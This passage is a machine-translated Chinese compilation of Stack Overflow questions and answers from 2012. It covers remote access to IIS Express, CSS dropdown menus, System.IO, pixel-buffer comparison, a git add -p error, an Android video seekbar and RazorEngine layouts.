> 时间：2012-11-11T02:35:44.007

考虑使用[jQuery UI 对话框](http://jqueryui.com/dialog/)。由于它是在 DOM 中处理的，因此不会被阻塞，并且您可以获得比原生`confirm` 和弹出窗口更多的灵活性。

# android - 在 Android 手机上调试 ASP.NET MVC 应用程序

> ID：13328090
> 
> 赞同：16
> 
> 时间：2012-11-11T02:30:45.117
> 
> 标签：android, asp.net-mvc, iis

**客观的**

我正在寻找最简单的分步设置过程，以使用我的 IP 地址作为 URL 来调试我的 ASP.NET MVC 4 应用程序。我希望能够使用我计算机的本地 IP 地址（例如 - `http://192.168.1.109:25968`）从我的 Android 手机访问该应用程序，该手机通过 Wi-Fi 连接到我的本地网络。我在 Windows 7 上运行 Visual Studio 2012 RC。

这个问题已经被另外两个问题（[这个](https://stackoverflow.com/questions/5901224)和[这个](https://stackoverflow.com/questions/4515724)）解决了，但是答案非常简短，根本没有帮助我。之前我不得不通过敲打我的电脑并盲目地更改每个设置直到某些东西起作用来解决这个问题。我不想再经历一次。我想了解这次我在做什么。

**设置信息**

该项目只是一个默认的 ASP.NET MVC 4 Internet 应用程序。我很确定我还没有改变任何东西。

我的应用程序属性中的 Web 选项卡设置为“使用本地 IIS Web 服务器”，并且我选中了“使用 IIS Express”。项目网址是`http://localhost:25968/`. 我看到“本地主机”可能有问题，但 VS 不会让我输入 IP 地址或通配符。

我的应用程序的 IIS Express applicationhost.config 文件如下所示。

```
<site name="APPLICATION_NAME" id="13">
    <application path="/" applicationPool="Clr4IntegratedAppPool">
        <virtualDirectory path="/" physicalPath="C:\Users\USERNAME\Documents\Visual Studio 11\Projects\APPLICATION_NAME" />
    </application>
    <bindings>
        <binding protocol="http" bindingInformation="*:25968:localhost" />
    </bindings>
</site> 
```

**发生了什么**

当我从主机连接到该站点时，`http://localhost:25968`它工作得很好。如果我尝试`http://192.168.1.109:25968`从主机使用，我会收到“错误请求 - 无效主机名，HTTP 错误 400。请求主机名无效。” 使用来自网络上另一台计算机的相同 URL，它只是超时。

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2013-10-11T04:09:12.220

授予自己绑定到 localhost 和通配符网络适配器的权限，配置 IIS Express 以绑定到它们，并在防火墙上打开端口。通过使用通配符，您无需在 IP 地址更改时重新配置。

**步骤详细信息：（**他们假设端口号为 5555 - 请改用您的实际端口）

1.  以管理员身份从命令提示符运行这些命令：

    ```
    netsh http add urlacl url=http://localhost:5555/ user="NT AUTHORITY\INTERACTIVE"
    netsh http add urlacl url=http://*:5555/ user="NT AUTHORITY\INTERACTIVE" 
    ```

2.  在*.vs\config\applicationhost.config*（或 VS2015 之前的*%USERPROFILE%\Documents\IISExpress\config\applicationhost.config*）中，将通配符绑定添加到您的站点。结果应如下所示：

    ```
    <site name="..." id="...">
        <!-- application settings omitted for brevity -->
        <bindings>
            <binding protocol="http" bindingInformation="*:5555:localhost" />
            <binding protocol="http" bindingInformation="*:5555:*" />
        </bindings>
    </site> 
    ```

3.  打开 IIS Express 站点的防火墙端口。您可以从管理命令提示符执行此操作：

    ```
    netsh advfirewall firewall add rule name="IISExpressWeb" dir=in protocol=tcp localport=5555 profile=private remoteip=localsubnet action=allow 
    ```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-11-11T02:42:35.927

试一试：

```
netsh http add urlacl url=http://192.168.1.109:25968/ user=everyone 
```

来自：http: [//johan.driessen.se/posts/Accessing-an-IIS-Express-site-from-a-remote-computer](http://johan.driessen.se/posts/Accessing-an-IIS-Express-site-from-a-remote-computer)

您也许可以用计算机的主机名替换 IP 地址，这样您就不必在每次 IP 更改时都重新运行它。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-11T05:22:14.253

我需要执行 cfeduke 提供的链接中的所有步骤。（不仅仅是他在回答中描述的那个。）

1.  在“localhost”绑定后添加`<binding protocol="http" bindingInformation="*:58938:192.168.1.42" />`到 applicationhost.config。
2.  跑`netsh http add urlacl url=http://192.168.1.42:58938/ user=everyone`
3.  跑`netsh advfirewall firewall add rule name="IISExpressWeb" dir=in protocol=tcp localport=58938 profile=private remoteip=localsubnet action=allow`

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2017-03-01T07:07:10.013

如果你的机器上有[Node.js](https://nodejs.org/en/)试试这个工具：**Ionut-Cristian Florescu**

[https://github.com/icflorescu/iisexpress-proxy](https://github.com/icflorescu/iisexpress-proxy)

要安装它，只需在命令行上编写`npm install -g iisexpress-proxy`

然后检查您在项目中拥有的端口并将其映射到外部端口。 `iisexpress-proxy [localPort] to [proxyPort]`

# html - 如何在纯 CSS 中使菜单具有子菜单

> ID：13328091
> 
> 赞同：0
> 
> 时间：2012-11-11T02:30:47.393
> 
> 标签：html, css

我想知道我是否可以让 ul 类 productnav 消失，直到鼠标悬停在产品按钮上？另外，我希望 productnav ul 像普通菜单一样放在一边。

的HTML：

```
<div class="sidebar1" align="center">
<ul class="nav">
  <li><a href="index.html">Home</a></li>
  <li><a href="#">Products</a></li>
      <ul class="productnav">
         <li><a href="#">Products Overview</a></li>
         <li><a href="#">Unibook Enterprise</a></li>
         <li><a href="#">Unibook Standard</a></li>
         <li><a href="#">Univoice 2.0</a></li>
         <li><a href="#">Univoice lite</a></li>
         <li><a href="#">Pricing</a></li>
         <li><a href="#">Demo</a></li>
      </ul>
  <li><a href="#">Solutions</a></li>
  <li><a href="#">Markets</a></li>
  <li><a href="#">About UDI</a></li>
  <li><a href="#">Contact Us</a></li>
</ul> 
```

忽略任何丢失的 /div 标签等。

CSS：

```
ul.nav {
    margin-top: 10px;
    margin-left: 2px;
    list-style: none; /* this removes the list marker */
    border-top: 1px solid #FFF; /* this creates the top border for the links - all         others are placed using a bottom border on the LI */
    margin-bottom: 15px; /* this creates the space between the navigation on the     content below */
}
ul.nav li {
    border-bottom: 1px solid #FFF; /* this creates the button separation */
}
ul.nav a, ul.nav a:visited { /* grouping these selectors makes sure that your links    retain their button look even after being visited */
    padding: 5px 5px 5px 15px;
    display: block; /* this gives the link block properties causing it to fill the   whole LI containing it. This causes the entire area to react to a mouse click. */
    width: 160px;  /*this width makes the entire button clickable for IE6\. If you don't   need to support IE6, it can be removed. Calculate the proper width by subtracting the padding on this link from the width of your sidebar container. */
    text-decoration: none;
    background-color: #CFCFCF;
}
ul.nav a:hover, ul.nav a:active, ul.nav a:focus { /* this changes the background and   text color for both mouse and keyboard navigators */
    background-color: #1075C7;
    color: #FFF;
}

/*-----------------------------*/

ul.productnav {
    margin-top: 10px;
    margin-left: 2px;
    list-style: none; /* this removes the list marker */
    border-top: 1px solid #FFF; /* this creates the top border for the links - all     others are placed using a bottom border on the LI */
    margin-bottom: 15px; /* this creates the space between the navigation on the   content below */
}
ul.productnav li {
    border-bottom: 1px solid #FFF; /* this creates the button separation */
}
ul.productnav a, ul.productnav a:visited { /* grouping these selectors makes sure that your links retain their button look even after being visited */
    padding: 5px 5px 5px 15px;
    display: block; /* this gives the link block properties causing it to fill the   whole LI containing it. This causes the entire area to react to a mouse click. */
    width: 160px;  /*this width makes the entire button clickable for IE6\. If you don't   need to support IE6, it can be removed. Calculate the proper width by subtracting the   padding on this link from the width of your sidebar container. */
    text-decoration: none;
    background-color: #CFCFCF;
}
ul.productnav a:hover, ul.productnav a:active, ul.productnav a:focus { /* this changes   the background and text color for both mouse and keyboard navigators */
    background-color: #1075C7;
    color: #FFF;
} 
```

请记住：我想要一个基本的子菜单；将鼠标悬停在产品上，您会看到 .productnav ul 出现在正常内容旁边。谢谢！

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-11T03:32:35.383

## 纯 CSS 方式

### HTML

```
<ul class="nav">
    <li>
        <a href="#">Menu 1</a>
        <ul>
            <li><a href="#">Sub Menu Item</a></li>
            <li><a href="#">Sub Menu Item</a></li>
            <li><a href="#">Sub Menu Item</a></li>
        </ul>
    </li>
    <li>
        <a href="#">Menu 2</a>
        <ul>
            <li><a href="#">Sub Menu Item</a></li>
            <li><a href="#">Sub Menu Item</a></li>
            <li><a href="#">Sub Menu Item</a></li>
        </ul>
    </li>
    <li>
        <a href="#">Menu 3</a>
        <ul>
            <li><a href="#">Sub Menu Item</a></li>
            <li><a href="#">Sub Menu Item</a></li>
            <li><a href="#">Sub Menu Item</a></li>
        </ul>
    </li>
</ul> 
```

### CSS

```
* {font-family: "Segoe UI", Tahoma;}
ul.nav {border-bottom: 1px solid #999;}
ul.nav li a {display: block; text-decoration: none; color: #333; padding: 5px; border: 1px solid #fff;}
ul.nav > li:hover {border: 1px solid #666; border-bottom: 1px solid #fff;}
ul.nav li a:hover {background: #ccc; border: 1px solid #999;}
ul.nav > li {display: inline-block; position: relative; border: 1px solid #fff;}
ul.nav > li ul {display: none; position: absolute; left: -1px; width: 150px; border: 1px solid #666; border-top-color: #fff; margin-top: 1px;}
ul.nav > li:hover ul {display: block;}
ul.nav > li ul li {display: block;} /* Vertical Menu */
ul.nav > li ul li {display: inline-block;} /* Horizontal Menu */ 
```

### 小提琴： http:
[//jsfiddle.net/vMuxA/](http://jsfiddle.net/vMuxA/)（垂直菜单）
[http://jsfiddle.net/vMuxA/1/](http://jsfiddle.net/vMuxA/1/)（水平菜单）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-11T02:50:40.797

Steve Gibson 写了一个关于如何做 css 菜单的例子。他使用无序列表。

[GRC 的无脚本纯 CSS 菜单系统](http://www.grc.com/menu2/invitro.htm)

```
 /*==============================================================================

    GRC multi-level script-free pure-CSS menuing system stylesheet.
   This code is hereby placed into the public domain by its author
   Steve Gibson. It may be freely used for any purpose whatsoever.

    Computed Geometries:    with a default 12px font, 1.0em == 12px and
    1px == 0.08333em.
    Thus, our 98px wide Freeware & Research buttons are 8.166666em wide.

==============================================================================*/

/*====== GLOBAL OVERRIDES FOR MAJOR ITEMS AND DIFFERING BROWSER DEFAULTS =====*/

body { color:#009; background:#fff; font-family: verdana, tahoma, arial, helvetica, sans-serif, MS Sans Serif; }
body, table, img, button, iframe, ul, li  { margin:0; padding:0; border:0; }
table { text-align:left; }
iframe { width:0; height:0 }

ul { margin-left:20px; }       /* kill default 50px left padding and set 20px */
li { margin-bottom:1em; }          /* set default inter-item vertical spacing */
.tightlist li { margin-bottom:0.25em; }     /* tighter list for simple bullets */

/* our default page-width div */
.pagecontainer { width:85%; text-align:left; font-size:10pt;}

 /*================= STYLES FOR THE GRC MASTHEAD & CONTROLS ==================*/

.menuminwidth0 {             /* for all browsers (non-IE) that obey min-width */
    position:relative;
    border:0;
    margin:0;
    padding:0;
    width:100%;
    height:55px;/* 36px masthead height + 18px button height + 1px lower border*/
    min-width:560px;
}

/* suppress our whole menu when not an interactive mode (when printing, etc.) */
@media print, projection { .menuminwidth0 { d\isplay:none; } }

* html .menuminwidth1 { /* this allows IE5/6 to simulate min-width capability */
    position:relative;  /* we can simulate a minimum width by creating a large */
    float:left;          /* border in this first div, then placing our content */
    height: 1px;          /* into a second nested div (see 2nd nested div next */
    border-left:560px solid #fff;    /* CSS box-model borders are a fixed size */
}

* html .menuminwidth2 {    /* used to simulate min-width capability for IE5/6 */
    position:relative;
    margin-left:-560px;
    height: 1px;
}

#masthead {
    position:relative;      /* position our child objects relative to this div */
    float:left;
    vertical-align:top;          /* protect from super-large user text sizing */
    border:0;
    margin:0;
    padding:0;
    width:100%;                                  /* grey-fill the entire width */
    height:36px;                  /* set the overall height above the menu-bar */
    background:#F3F3F3;                          /* a very light shade of grey */
}

#mastheadlogo {
    float:left;
    vertical-align:top;
    border:0;
    padding:0;
    margin:6px 0 0 7px;
}

#focus {                                                 /* GRC's focus label */
    position:absolute;
    border:0;
    margin:0;
    padding:0;
    top:15px;
    left:301px;
    width:121px;
    height:13px;
}

#search {                                                    /* search button */
    position:absolute;
    border:0;
    margin:0;
    padding:0;
    top:7px;
    right:6px;
    width:60px;
    height:19px;
}

#text {                                                 /* search text field */
    position:absolute;
    border:1px solid #404040;
    margin:0;
    padding:0 0 0 2px;
    top:7px;
    right:65px;
    width:12em;
/*  height:1.215em;         we'll define this at the bottom of our style sheet */
    font-size:14px !important;
    background:#fefefe;
}

#yah {                                    /* the "You are here" label graphic */
    position:absolute;
    top:5px;
    right:99px;
    width:87px;
    height:9px;
}

 /*========================= TOP OF THE MENU CASCADE =========================*/

.menu {
    position:relative;        /* establish a menu-relative positioning context */
    float:left;                                     /* play nicely with others */
    margin:0;
    padding:0;
    border:0;
    height:18px;                                  /* the menu's overall height */
    width:100%;         /* we always want our menu to fill the available space */
    background:#f3f3f3;
    font-family: Verdana, Arial, Helvetica, sans-serif;
    font-size:12px;         /* this (and also below) sets the menu's font size */
    border-bottom:1px solid black;        /* give us a black border underneath */
}

.menu img {
    vertical-align: top;      /* prevent images from being pushed down by text */
}

.menu ul {
    padding:0;
    margin:0;
    border:0;
    list-style-type:none;          /* we don't want to view the list as a list */
    line-height:1.5em;           /* globally set the menu's item spacing. note */
}                               /* this must be 1.0 or 1.5 or 2.0 for Mozilla */

.menu li {
    float:left;    /* this creates the side-by-side array of top-level buttons */
    position:relative;    /* create local positioning contexts for each button */
    margin:0;
}

.menu ul li table {
    margin:-1px 0;              /* IE5 needs -1px top and bottom table margins */
    m\argin:0;               /* re-zero the table margins for everyone but IE5 */
    border-collapse:collapse;      /* IE5 needs this for the sub-menus to work */
    font-size:12px;        /* this sets the base font size for our entire menu */
}

.drop {
    display:block;
    padding:0px 0.33em;        /* this sets the l/r margins for our menu item */
    margin:0;
    text-align:right;   /* this right alignment goes with the float:left below */
    cursor:pointer;      /* IE tries to switch back to an I-beam, don't let it */
    cursor:hand;           /* IE5 only knows about "hand", so set it both ways */
}

.drop span {        /* this simultaneously left and right aligns the text and */
    float:left;       /* the >> in the drop-down menus which link to sub-menus */
}

.rightmenu {
    position:relative;  /* establish a local positioning context for YAH label */
    float:right;                  /* and right-align it at the top of our page */
}

#research {            /* this rightmost "Research" button must be positioned */
    position:absolute;       /* absolutely so that the YAH (you are here) text */
    top:0px;               /* label will slide underneath it under Opera v8.54 */
    left:364px;    /* which has a z-order sequencing bug with abs-pos elements */
}

/*======================== TOP LEVEL MENU DEFINITIONS ========================*/

.menu ul li ul {
    display:none;                  /* initially hide the entire list hierarchy */
    padding:1px;                               /* this is our box border width */
}

.menu ul li a,
.menu ul li a:visited {                    /* unselected top-level menu items */
    display:block;
    float:left;
    text-decoration:none;
    height:18px;
}

.menu ul li:hover a,
.menu ul li a:hover {                        /* selected top-level menu items */
    border-top:1px solid #000;    /* these 2 lines create the push-in illusion */
    height:16px;
}

/*======================== 2ND LEVEL MENU DEFINITIONS ========================*/

.menu ul li:hover ul,
.menu ul li a:hover ul {                           /* 2nd level drop-down box */
    display:block;
    position:absolute;
    margin:0;
    top:18px;              /* place us just up underneath the top-level images */
    left:-1px;       /* left-align our drop-down to the previous button border */
    height:auto;      /* the drop-down height will be determiend by line count */
    width:13.5em;
    color:black;                        /* this sets the unselected-text color */
    background:black;         /* this sets our menu's effective "border" color */
}

.menu ul li:hover ul.leftbutton,
.menu ul li a:hover ul.leftbutton {/* our first dropdown should not be skewed */
    left:0px;
}

.menu ul li:hover ul.skinny,
.menu ul li a:hover ul.skinny {             /* 2nd level skinny drop-down box */
    width:8.08333em;   /* with a 12px default font, this is 97px width (97/12) */
}

.menu ul.rightmenu li:hover ul,
.menu ul.rightmenu li a:hover ul {    /* 2nd level neighborhood drop-down box */
    left:auto;
    right:0;         /* nudge the right menu right to line up under the border */
}

* html .menu ul.rightmenu li a:hover ul {         /* IE5/6 needs a tweak here */
    right:-1px;
}

.menu ul li:hover ul li a,
.menu ul li a:hover ul li a {                   /* 2nd level unselected items */
    border:0;
    margin:0;
    padding:0;
    height:auto;
    color:#000;               /* this sets the unselected drop-down text color */
    background:#d8d8d8;       /* this sets the drop-down menu background color */
    width:13.5em;
}

.menu ul li:hover ul li:hover a,
.menu ul li a:hover ul li a:hover {                /* 2nd level selected item */
    color:black;
    background:white;
}

.menu ul li:hover ul.skinny li a,
.menu ul li a:hover ul.skinny li a,
.menu ul li:hover ul.skinny li a:hover,
.menu ul li a:hover ul.skinny li a:hover {     /* 2nd level un+selected items */
    width:8.08333em;
}

/*======================== 3RD LEVEL MENU DEFINITIONS ========================*/

.menu ul li:hover ul li ul,
.menu ul li a:hover ul li a ul {             /* hide inactive 3rd-level menus */
    visibility:hidden;
}

.menu ul li:hover ul li:hover ul,
.menu ul li a:hover ul li a:hover ul {             /* 3rd level drop-down box */
    visibility:visible;
    position:absolute;
    margin-top:-1px;          /* bring the top edge of the 3rd level menu up one */
    top:0;
    left:8.08333em;
    width:14em;
}

.menu ul li:hover ul li:hover ul li a,
.menu ul li a:hover ul li a:hover ul li a {     /* 3rd level unselected items */
    width:14em;
    background:#d8d8d8;
}

.menu ul li:hover ul li:hover ul li a:hover,
.menu ul li a:hover ul li a:hover ul li a:hover {    /* level3 selected items */
    width:14em;
    background:white;
}

#text {           /* the Mac's standard Safari browser will not see this code */
    height:1.215em;#           /* ...  but every other browser will and should */
} /* Safari barfs on the illegal pound sign (#) after the rule's property val */ 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-11T03:29:16.033

ul.menu 是所有其他人的父级，但与您的 html 方法不同：子菜单（`ul`标签）位于父级菜单项（`li`标签）内，这更符合 html 要求（[w3 建议](http://www.w3.org/TR/xhtml-modularization/abstract_modules.html#s_listmodule)，[一个问题](https://stackoverflow.com/questions/2161337/can-we-use-any-other-tag-inside-ul-along-with-li)，或者只是在[验证器](http://validator.w3.org)中测试它）。因此，您的示例将变为以下内容：

```
<div class="sidebar1" align="center">
<ul class="nav">
  <li><a href="index.html">Home</a></li>
  <li><a href="#">Products</a>
      <ul class="productnav">
         <li><a href="#">Products Overview</a></li>
         <li><a href="#">Unibook Enterprise</a></li>
         <li><a href="#">Unibook Standard</a></li>
         <li><a href="#">Univoice 2.0</a></li>
         <li><a href="#">Univoice lite</a></li>
         <li><a href="#">Pricing</a></li>
         <li><a href="#">Demo</a></li>
      </ul>
    </li>
  <li><a href="#">Solutions</a></li>
  <li><a href="#">Markets</a></li>
  <li><a href="#">About UDI</a></li>
  <li><a href="#">Contact Us</a></li>
</ul> 
```

还有我会使用的css（即使你可以去掉尺寸，只要它们都是一样的，我认为）：

```
.nav li
{
    position:relative;
    float:left;
    width:180px;
    height:30px;
    padding:0;
    margin:0;
    list-style: none;
}

.nav ul
{       
    display:none;
    position:absolute;
    padding:0;
    margin:5px 0 0 0;
}

.nav ul li ul
{
    left:100%;
    top:0;
    margin:0px;
}

/* hiding or showing on second generations */
.nav li:hover ul ul, .nav li:hover ul ul ul
{
    display: none;
}

.nav li:hover ul, .nav ul li:hover ul, .nav ul ul li:hover ul
{
    display: block;
} 
```

`ul`这适用于您的 s 中最多三个递归级别`ul.nav`，但您可以通过修改最后两个 css 块的选择器来扩展它。

但我仍然认为用 javascript 中的悬停事件替换出现在悬停时`:hover`的`.over`类会带来更好的感觉，因为您可以设置超时以在悬停菜单后保持菜单显示一小会儿。导航到子菜单时，允许使用指针进行更自然的移动，使用 css 方法，您必须留在`li`标签内。

# c# - “System.IO”在 C# 中是什么意思？

> ID：13328093
> 
> 赞同：5
> 
> 时间：2012-11-11T02:30:52.200
> 
> 标签：c#, .net

我在学习 .Net 的第一年，来到了“System.IO 类简介”一章

我只是想知道 .IO 代表什么。我明白这是在学习如何使用目录、文件和路径。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-11T02:32:41.963

“IO”是输入/输出的标准首字母缩写词。`System.IO`命名空间包含所有处理输入/输出的类，例如读/写文件。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-11T02:34:51.950

IO 本身代表输入/输出。

这是整个`System.IO`命名空间：http: [//msdn.microsoft.com/en-us/library/system.io.aspx](http://msdn.microsoft.com/en-us/library/system.io.aspx)

您可能会涵盖目录、文件和流。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-11-11T02:33:01.303

`IO`代表`Input and Output`。基本上`System.IO`包含读取和写入文件以及使用`Streams`您已经说过的方法。

# iphone - 比较两个无符号字符缓冲区

> ID：13328110
> 
> 赞同：0
> 
> 时间：2012-11-11T02:34:06.250
> 
> 标签：iphone, ios, ipad

我有两个 CVImageBufferRef 缓冲区，它们对应于 AVCaptureSession 依次抓取的两个图像。我想比较两者以查看所有像素是否相同。为了遍历帧缓冲区的所有像素并比较它们，我有这个：

```
unsigned char *pixelA = (unsigned char *)CVPixelBufferGetBaseAddress(pixelBufferA);
unsigned char *pixelB = (unsigned char *)CVPixelBufferGetBaseAddress(pixelBufferB);

- (BOOL) isBuffer:(unsigned char *)pixelA equalToBuffer:(unsigned char *)pixelB {
    for( int row = 0; row < bufferHeight; row++ ) {
        for( int column = 0; column < bufferWidth; column++ ) {

            if ((pixelA[0] != pixelB[0]) ||
                (pixelA[1] != pixelB[1]) ||
                (pixelA[2] != pixelB[2]) ){
                return NO; 
                // means at some point pixelA is not equal to pixelB, so
                // pixelBufferA is not equal to pixelBufferB
            }

            pixelA += BYTES_PER_PIXEL;
            pixelB += BYTES_PER_PIXEL;

        }
    }

        // if the method reached here, pixelBufferA is equal to pixelBufferB, so
        return YES; // are equal
} 
```

显然，它在比较中崩溃了。如何将 pixelA 中的所有值与 pixelB 进行比较？谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-11T03:30:14.030

我从来没有真正做过你正在做的事情，但是有没有理由你不能一次性比较缓冲区，比如说，`memcmp`？

```
- (BOOL) isBuffer:(unsigned char*)pixelA equalToBuffer:(unsigned char*)pixelB
{
    size_t bufferSize = bufferWidth * bufferHeight * BYTES_PER_PIXEL;

    return memcmp( pixelA, pixelB, bufferSize ) == 0;
} 
```

# git - git add --patch 产生“不是 git 存储库”

> ID：13328111
> 
> 赞同：3
> 
> 时间：2012-11-11T02:34:42.037
> 
> 标签：git, version-control, workflow

我目前在 Windows 7x64 机器上开发一些使用 Git 进行版本控制的软件。

我很习惯这样做`git add -p`，这样我就不必担心一次只处理一个功能。但是，最近，该功能对我不起作用。当我运行它时，我得到了这个：

```
PS C:\Users\path\to\folder> git add -p .
fatal: Not a git repository: '.git'
rev-parse --show-prefix: command returned error: 128 
```

相同的中断，`git reset -p`但不是出于某种原因。存储库的所有其他功能正常工作。我已经尝试过重新初始化、删除我的工作目录并从 Github 重新克隆 repo， 正如一篇文章中所建议的那样。`git add``git reset``git checkout -f`

为什么我会遇到这个问题，我该如何解决？

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2013-02-12T18:28:56.053

当我通过 msysgit 安装 GitHub for Windows 时，这发生在我身上。我终于意识到，我在普通 shell（Console2）中使用的 git 版本比 GitHub Shell 使用的版本旧。Console2 版本有这个问题，而 GitHub Shell 运行良好。

我卸载了旧版本的 git，并将以下行添加到我的`profile.ps1`

```
.(Resolve-Path "$env:LOCALAPPDATA\GitHub\shell.ps1") 
```

这会加载 GitHub for Windows 在安装时生成的 powershell 脚本，并将正确获取最新版本的 git。

# android - 将搜索栏添加到 android 视频播放器

> ID：13328113
> 
> 赞同：3
> 
> 时间：2012-11-11T02:34:52.403
> 
> 标签：android, seekbar, android-video-player

```
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.URL;
import java.net.URLConnection;

import android.app.Activity;
import android.os.Bundle;
import android.os.Handler;
import android.util.Log;
import android.view.MotionEvent;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.View.OnTouchListener;
import android.webkit.URLUtil;
import android.widget.EditText;
import android.widget.ImageButton;
import android.widget.SeekBar;
import android.widget.Toast;
import android.widget.VideoView;

public class VideoViewDemo extends Activity implements OnClickListener, OnTouchListener {
    private static final String TAG = "VideoViewDemo";

    private VideoView mVideoView;
    private EditText mPath;
    private ImageButton mPlay;
    private ImageButton mPause;
    private ImageButton mReset;
    private ImageButton mStop;
    private String current;

    private int lengthOfAudio;
    private SeekBar seekBar;
    private final Handler handler = new Handler();
    private final Runnable r = new Runnable() {@
        Override
        public void run() {
            updateSeekProgress();
        }
    };

    @Override
    public void onCreate(Bundle icicle) {
        super.onCreate(icicle);
        setContentView(R.layout.main);
        mVideoView = (VideoView) findViewById(R.id.surface_view);

        mPath = (EditText) findViewById(R.id.path);
        mPath.setText("http://daily3gp.com/vids/747.3gp");

        mPlay = (ImageButton) findViewById(R.id.play);
        mPause = (ImageButton) findViewById(R.id.pause);
        mReset = (ImageButton) findViewById(R.id.reset);
        mStop = (ImageButton) findViewById(R.id.stop);

        seekBar = (SeekBar) findViewById(R.id.seekBar);
        seekBar.setOnTouchListener(this);

        mPlay.setOnClickListener(new OnClickListener() {
            public void onClick(View view) {
                playVideo();
            }
        });
        mPause.setOnClickListener(new OnClickListener() {
            public void onClick(View view) {
                if (mVideoView != null) {
                    mVideoView.pause();
                }
            }
        });
        mReset.setOnClickListener(new OnClickListener() {
            public void onClick(View view) {
                if (mVideoView != null) {
                    mVideoView.seekTo(0);
                }
            }
        });
        mStop.setOnClickListener(new OnClickListener() {
            public void onClick(View view) {
                if (mVideoView != null) {
                    current = null;
                    mVideoView.stopPlayback();
                }
            }
        });

        runOnUiThread(new Runnable() {
            public void run() {
                playVideo();
                updateSeekProgress();
            }
        });
    }
    public void onClick(View view) {
        updateSeekProgress();
    }

    public boolean onTouch(View v, MotionEvent event) {
        if (mVideoView.isPlaying()) {
            SeekBar tmpSeekBar = (SeekBar) v;
            mVideoView.seekTo((lengthOfAudio / 100) * tmpSeekBar.getProgress());
        }
        return false;
    }

    private void playVideo() {
        try {
            final String path = mPath.getText().toString();
            Log.v(TAG, "path: " + path);
            if (path == null || path.length() == 0) {
                Toast.makeText(VideoViewDemo.this, "File URL/path is empty",
                    Toast.LENGTH_LONG).show();

            } else {
                // If the path has not changed, just start the media player
                if (path.equals(current) && mVideoView != null) {
                    mVideoView.start();
                    //mVideoView.requestFocus();
                    return;
                }
                current = path;
                mVideoView.setVideoPath(getDataSource(path));

                lengthOfAudio = 180000;
                mVideoView.start();
                //mVideoView.requestFocus();

            }
        } catch (Exception e) {
            Log.e(TAG, "error: " + e.getMessage(), e);
            if (mVideoView != null) {
                mVideoView.stopPlayback();
            }
        }
    }

    private void updateSeekProgress() {
        if (mVideoView.isPlaying()) {
            seekBar.setProgress((int)(((float) mVideoView.getCurrentPosition() / lengthOfAudio) * 100));
            handler.postDelayed(r, 1000);
        }
    }

    private String getDataSource(String path) throws IOException {
        if (!URLUtil.isNetworkUrl(path)) {
            return path;
        } else {
            URL url = new URL(path);
            URLConnection cn = url.openConnection();
            cn.connect();
            InputStream stream = cn.getInputStream();
            if (stream == null)
                throw new RuntimeException("stream is null");
            File temp = File.createTempFile("mediaplayertmp", "dat");
            temp.deleteOnExit();
            String tempPath = temp.getAbsolutePath();
            FileOutputStream out = new FileOutputStream(temp);
            byte buf[] = new byte[128];
            do {
                int numread = stream.read(buf);
                if (numread <= 0)
                    break;
                out.write(buf, 0, numread);
            } while (true);
            try {
                stream.close();
            } catch (IOException ex) {
                Log.e(TAG, "error: " + ex.getMessage(), ex);
            }
            return tempPath;
        }
    }
} 
```

我从[http://davanum.wordpress.com/2009/12/04/android-%E2%80%93-videomusic-player-sample-take-2/ 获取](http://davanum.wordpress.com/2009/12/04/android-%E2%80%93-videomusic-player-sample-take-2/)了一个示例教程， 并进一步增强了它以实现搜索栏。我已经添加了代码，但是随着视频的进行，搜索栏不会移动。我做错什么了吗？我是android编程的新手。

# c# - 带有 RazorEngine 和布局的 TemplateCompilationError

> ID：13328114
> 
> 赞同：10
> 
> 时间：2012-11-11T02:35:02.363
> 
> 标签：c#, razor, razorengine

我一直在尝试在我的一个小项目中使用 RazorEngine，但是当我尝试使用模板布局时无法克服这个错误。

> 无法编译模板。“object”不包含“Description”的定义，并且找不到接受“object”类型的第一个参数的扩展方法“Description”（您是否缺少 using 指令或程序集引用？）

**我的设置：** 我有一个这样的模板布局：

```
<html>
<head>
    <title>@Model.Description</title>
</head>
<body>
    @RenderBody()
</body>
</html> 
```

然后是一个看起来像这样的页面模板：

```
@{
    _Layout = "Layout.cshtml";
}
<h1>@Model.Description</h1> 
```

这是我用来尝试解决这个问题的测试 Main 函数：

```
 static void Main(string[] args)
    {
        // Configuration for RazorEngine
        var config = new TemplateServiceConfiguration
        {
            EncodedStringFactory = new RawStringFactory(),

            Resolver = new DelegateTemplateResolver(name =>
            {
                var file = name;
                var content = File.ReadAllText("Templates/" + file);
                return content;
            })
        };

        // Try to render output using Razor
        using (var service = new TemplateService(config))
        {
            string template = File.ReadAllText("Templates/Default.cshtml");

            dynamic model = new ExpandoObject();
            model.Description = "This is a test";
            string result = service.Parse(template, model);
            Console.WriteLine(result);
            if (Debugger.IsAttached)
            {
                Console.ReadLine();
            }

        }
    } 
```

知道我错过了什么吗？

更新：如果我用带有描述属性的 POCO 替换动态模型对象，它会起作用。我还尝试了 Parse 的类型化版本

> 动态的

, `ExpandoObject`,`IDictionary<string, object>`但它们都有相同的错误。

**更新：** 我在 Github 上发现了这个项目，它似乎以某种方式工作： [https ://github.com/mikoskinen/graze/blob/master/src/core/Graze.cs#L174](https://github.com/mikoskinen/graze/blob/master/src/core/Graze.cs#L174)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-19T03:22:59.670

我认为使用模板服务的`Parse`重载更合适，它在您的视图中`ViewBag`使用 a 并`ViewBag`在您的视图中使用而不是模型。

编辑：

```
public virtual string Parse(string razorTemplate, object model, DynamicViewBag viewBag, string cacheName) 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-22T19:04:36.460

您不能将匿名类型传递给动态类型视图，因为匿名类型被编译为内部类型。由于 CSHTML 视图被编译成一个单独的程序集，它不能访问匿名类型的属性。

* * *

## 回答 #3

